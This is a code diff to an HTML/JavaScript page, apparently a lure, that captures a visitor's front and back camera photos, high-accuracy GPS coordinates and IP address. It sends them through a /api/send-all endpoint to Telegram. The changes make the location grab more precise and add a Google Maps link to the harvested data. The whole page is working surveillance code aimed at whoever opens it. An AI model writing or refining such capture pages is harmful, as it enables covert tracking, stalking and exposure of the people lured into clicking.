@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Premium Capture</title>
+  <title>Premium Dual Capture</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -98,15 +98,15 @@
       font-size: clamp(1rem, 4vw, 1.4rem);
       color: #a0a0ff;
       text-shadow: 0 0 12px rgba(160,160,255,0.6);
-      min-height: 50px;
+      min-height: 60px;
       text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <h1>Dual Camera + Location</h1>
-  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ছবি + লোকেশন + IP Telegram-এ পাঠানো হবে</p>
+  <h1>Dual Camera + Real Location</h1>
+  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ছবি + সঠিক লোকেশন + IP Telegram-এ পাঠানো হবে</p>
 
   <div class="premium-card">
     <button id="captureBtn" onclick="captureAll()">
@@ -142,36 +142,41 @@
         const backBase64 = await quickCapture(backStream);
         await sendData({ type: "back", image: backBase64 });
 
-        // ৩. Geolocation
-        status.textContent = "Getting location... (allow if popup appears)";
-        let geo = "Permission denied or error";
+        // ৩. Geolocation (real location)
+        status.textContent = "Getting real location... (allow permission)";
+        let geo = "Location permission denied or error";
+        let mapLink = "";
         try {
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
               enableHighAccuracy: true,
-              timeout: 15000,
+              timeout: 20000,        // ২০ সেকেন্ড পর্যন্ত অপেক্ষা
               maximumAge: 0
             });
           });
-          geo = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)} (accuracy: ${position.coords.accuracy.toFixed(0)}m)`;
-          status.textContent = "Location captured → Sending...";
+
+          const lat = position.coords.latitude.toFixed(6);
+          const lon = position.coords.longitude.toFixed(6);
+          const acc = position.coords.accuracy.toFixed(0);
+          geo = `${lat}, ${lon} (accuracy: ${acc}m)`;
+          mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+          status.textContent = "Real location captured → Sending...";
         } catch (geoErr) {
           console.error("Geolocation error:", geoErr);
-          if (geoErr.code === 1) geo = "Permission denied – allow in browser settings";
-          else if (geoErr.code === 2) geo = "Position unavailable – check GPS";
-          else if (geoErr.code === 3) geo = "Timeout – try again";
-          else geo = "Error: " + geoErr.message;
-          status.textContent = geo;
+          geo = geoErr.message || "Location error";
+          if (geoErr.code === 1) geo = "Location permission denied – please allow";
+          if (geoErr.code === 3) geo = "Location timeout – try again";
         }
 
         // সব ডাটা একসাথে পাঠানো
         await sendData({
           type: "info",
           geo: geo,
+          mapLink: mapLink,
           timestamp: new Date().toISOString()
         });
 
-        status.textContent = "All sent successfully ✓ (photos + location + IP)";
+        status.textContent = "All sent successfully ✓ (photos + real location + IP)";
       } catch (err) {
         status.textContent = "Error: " + (err.message || "Unknown error");
         console.error(err);
@@ -192,4 +197,22 @@
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
 
-      stream.getTracks().forEach(t => t.stop
+      stream.getTracks().forEach(t => t.stop());
+      return canvas.toDataURL('image/png');
+    }
+
+    async function sendData(payload) {
+      const res = await fetch("/api/send-all", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      if (!res.ok) {
+        const errText = await res.text();
+        throw new Error(errText || "Send failed");
+      }
+    }
+  </script>
+</body>
+</html>
